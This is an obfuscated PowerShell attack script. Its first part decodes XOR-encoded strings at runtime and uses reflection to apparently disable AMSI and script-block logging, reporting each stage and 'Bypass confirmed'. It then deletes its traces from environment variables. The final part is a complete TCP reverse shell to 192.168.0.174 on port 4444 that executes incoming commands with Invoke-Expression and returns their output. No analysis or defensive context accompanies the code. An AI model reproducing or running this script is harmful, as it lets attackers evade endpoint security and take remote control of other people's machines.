$env:KDgWLoF1 = "GXgVeAt4EXgxeBZ4EXgMeD54GXgReBR4HXgceA=="
$env:WutS2OJm = "MHgzeD14IXgneDR4N3g7eDl4NHgneDV4OXg7eDB4MXg2eD14JHgreDd4PngseC94OXgqeD14JHgoeBd4FHgReBt4EXgdeAt4JHg1eBF4G3gKeBd4C3gXeB54DHgkeC94EXgWeBx4F3gPeAt4JHgoeBd4D3gdeAp4K3gQeB14FHgUeCR4K3gbeAp4EXgIeAx4OngUeBd4G3gTeDR4F3gfeB94EXgWeB94"
$env:gbqkthWv = "K3gdeAx4LngZeBR4DXgdeA=="
$env:hpYwI8BP = "K3gBeAt4DHgdeBV4Vng1eBl4FngZeB94HXgVeB14FngMeFZ4OXgNeAx4F3gVeBl4DHgReBd4FnhWeDl4FXgLeBF4LXgMeBF4FHgLeA=="
$env:TDefbm8O = "PXgWeBl4GngUeB14K3gbeAp4EXgIeAx4OngUeBd4G3gTeDR4F3gfeB94EXgWeB94"
$env:QHi1Ol5D = "P3gdeAx4LngZeBR4DXgdeA=="
$env:BMMOiwxJ = "P3gdeAx4PngReB14FHgceA=="
$env:xbs8yuGt = "K3gBeAt4DHgdeBV4Vng1eBl4FngZeB94HXgVeB14FngMeFZ4OXgNeAx4F3gVeBl4DHgReBd4FnhWeC14DHgReBR4C3g="
$env:b10oNcPW = "P3gdeAx4LHgBeAh4HXg="
$env:Mlb0Er6I = "G3gZeBt4EHgdeBx4P3gKeBd4DXgIeCh4F3gUeBF4G3gBeCt4HXgMeAx4EXgWeB94C3g="

function fChdziHp($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=($b[$i] -bxor 236) -bxor 148};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$j10 = fChdziHp 'b10oNcPW'
$cgt = fChdziHp 'BMMOiwxJ'
$xdl = fChdziHp 'gbqkthWv'
$ze1 = fChdziHp 'QHi1Ol5D'
$tlc = [System.Reflection.BindingFlags]((0x07 -bxor 0x27) + (0x75 -bxor 0x7D))

$a9o = [PSObject].Assembly

try {
  $null = (Get-WmiObject Win32_Processor).Name
  $null = [Environment]::ProcessorCount
  Start-Sleep -Milliseconds 161

  try {
    $i3s = fChdziHp 'xbs8yuGt'
    $yig = $a9o.$j10($i3s)
    $x3w = fChdziHp 'Mlb0Er6I'
    $ey9 = fChdziHp 'WutS2OJm'
    $owh = $yig.$cgt($x3w, $tlc)
    $ebb = fChdziHp 'TDefbm8O'
    $s72 = $owh.$ze1($null)
    if ($s72 -eq $null) {
      $s72 = @{}
      $owh.$xdl($null, $s72)
    }
    $wqy = New-Object "System.Collections.Generic.Dictionary[string,object]"
    $wqy.Add($ebb, 0)
    $s72[$ey9] = $wqy
    $m8k = $owh.$ze1($null)
    if ($m8k -ne $null -and $m8k.ContainsKey($ey9) -and $m8k[$ey9][$ebb] -eq 0) {
      Write-Host '[+] Stage 1 OK'
    } else {
      Write-Host '[!] Stage 1 failed'
    }
  } catch {
    Write-Host '[!] Stage 1 failed'
  }

  try {
    $azv = fChdziHp 'hpYwI8BP'
    $j26 = $a9o.$j10($azv)
    $rph = fChdziHp 'KDgWLoF1'
    $ze4 = [System.DateTime]::Now.Ticks
    $rtx = $j26.$cgt($rph, $tlc)
    $rtx.$xdl($null, $true)
    $yva = $rtx.$ze1($null)
    if ($yva -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $i0u = fChdziHp 'hpYwI8BP'
    $juq = $a9o.$j10($i0u)
    if ($juq -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }
}
finally {
  Remove-Item Env:\b10oNcPW -ErrorAction SilentlyContinue
  Remove-Item Env:\BMMOiwxJ -ErrorAction SilentlyContinue
  Remove-Item Env:\gbqkthWv -ErrorAction SilentlyContinue
  Remove-Item Env:\QHi1Ol5D -ErrorAction SilentlyContinue
  Remove-Item Env:\hpYwI8BP -ErrorAction SilentlyContinue
  Remove-Item Env:\KDgWLoF1 -ErrorAction SilentlyContinue
  Remove-Item Env:\xbs8yuGt -ErrorAction SilentlyContinue
  Remove-Item Env:\Mlb0Er6I -ErrorAction SilentlyContinue
  Remove-Item Env:\WutS2OJm -ErrorAction SilentlyContinue
  Remove-Item Env:\TDefbm8O -ErrorAction SilentlyContinue
}
        # Reverse shell execution
        try {
            $LHOST = "192.168.0.174"; 
            $LPORT = 4444; 
            $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
            $NetworkStream = $TCPClient.GetStream(); 
            $StreamReader = New-Object IO.StreamReader($NetworkStream); 
            $StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
            $StreamWriter.AutoFlush = $true; 
            $Buffer = New-Object System.Byte[] 1024; 
            while ($TCPClient.Connected) { 
                while ($NetworkStream.DataAvailable) { 
                    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
                    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 
                }; 
                if ($TCPClient.Connected -and $Code.Length -gt 1) { 
                    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; 
                    $StreamWriter.Write("$Output`n"); 
                    $Code = $null 
                } 
            }; 
            $TCPClient.Close(); 
            $NetworkStream.Close(); 
            $StreamReader.Close(); 
            $StreamWriter.Close()
        } catch {
            Write-Host "[!] Reverse shell connection failed"
        }
        
